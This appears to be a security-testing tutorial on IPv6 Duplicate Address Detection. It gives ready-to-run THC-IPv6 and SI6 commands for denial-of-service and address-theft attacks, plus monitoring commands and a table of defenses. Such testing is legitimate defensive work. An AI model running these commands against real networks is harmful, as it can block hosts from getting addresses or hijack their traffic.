# How to Test IPv6 Duplicate Address Detection Attacks

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: IPv6, DAD, Duplicate Address Detection, Security Testing, NDP, DoS

Description: A guide to testing IPv6 Duplicate Address Detection (DAD) vulnerabilities including DAD DoS attacks and address theft in authorized lab environments.

IPv6 Duplicate Address Detection (DAD) is a mechanism where a host checks whether a new IPv6 address it wants to use is already in use on the link. By sending a Neighbor Solicitation for the tentative address and listening for replies, DAD prevents address conflicts. However, DAD can be abused to prevent hosts from configuring addresses or to steal addresses.

**Warning**: Only test in authorized lab environments.

## How DAD Works

```text
Host (configuring 2001:db8::10)
  |
  |-- NS: "Is 2001:db8::10 in use?" --> ff02::1:ff00:10 (solicited-node multicast)
  |
  | (waits ~1 second)
  |
  | No response = address is unique, proceed
  | NA response received = DUPLICATE, address not used
```

## DAD DoS Attack: Preventing Address Configuration

By responding to every DAD probe with a fake NA, an attacker can prevent any host from configuring IPv6 addresses:

### Method 1: dos-new-ip6 (THC-IPv6)

```bash
# Respond to all DAD probes (prevents any host from getting an IPv6 address)

sudo dos-new-ip6 eth0

# Target specific prefix
sudo dos-new-ip6 eth0 2001:db8::/64
```

### Method 2: fake_advertise6 (THC-IPv6)

```bash
# Respond to DAD probes for a specific address (steal that address)
sudo fake_advertise6 eth0 2001:db8::10

# Make it appear the address is in use
sudo fake_advertise6 -i eth0 2001:db8::10
```

### Method 3: detect-new-ip6 + custom response

```bash
# Monitor for DAD probes and respond
sudo detect-new-ip6 eth0 | while read line; do
  # Parse new address and send NA claiming it
  addr=$(echo "$line" | awk '{print $1}')
  sudo fake_advertise6 eth0 $addr
done
```

## Address Theft via DAD

An attacker can "steal" a host's IPv6 address during DAD:

```bash
# When victim boots and begins DAD for its address, claim it first
# Monitor for DAD probes
sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 135'

# When you see a NS with unspecified source (::) - it's a DAD probe
# Quickly send NA claiming ownership of that address
sudo fake_advertise6 eth0 <detected_tentative_address>
```

## SI6 Networks Approach with ns6 + na6

```bash
# Send a fake NA in response to a DAD probe for 2001:db8::10
# (simulates another host claiming ownership)
sudo na6 -i eth0 \
  -s 2001:db8::10 \      # Source claiming ownership
  -d ff02::1 \            # Send to all nodes
  -t 2001:db8::10 \      # Target address
  --solicited-flag \
  --override
```

## Monitoring DAD Activity

```bash
# Watch for DAD probes (NS with source ::)
sudo tcpdump -i eth0 -n -v 'icmp6 and ip6[40] == 135 and src == ::'

# Monitor address configuration events
sudo journalctl -f | grep -i "ipv6\|dad\|duplicate"

# Check kernel DAD statistics
cat /proc/net/snmp6 | grep -i "dad\|duplicate"
```

## Verifying DAD Settings

```bash
# Check number of DAD transmissions (0 = DAD disabled)
cat /proc/sys/net/ipv6/conf/eth0/dad_transmits

# Disable DAD (not recommended for production)
sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=0

# Standard value is 1 (one NS probe)
sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=1
```

## Defenses Against DAD Attacks

| Defense | Implementation |
|---|---|
| SEND (RFC 3971) | Cryptographically signed NS/NA |
| Secure DAD (SeND) | Prevents fake NA during DAD |
| NDPMon | Detects DAD interference |
| Port security | Limits which hosts can send NDP |
| RA Guard + NDP Inspection | Switch-level filtering |

```bash
# Monitor for DAD failures in syslog
sudo journalctl -f -u NetworkManager | grep -i duplicate
```

Understanding DAD attacks is important for IPv6 network security - particularly in environments without SEND, where any host on the segment can interfere with IPv6 address assignment.
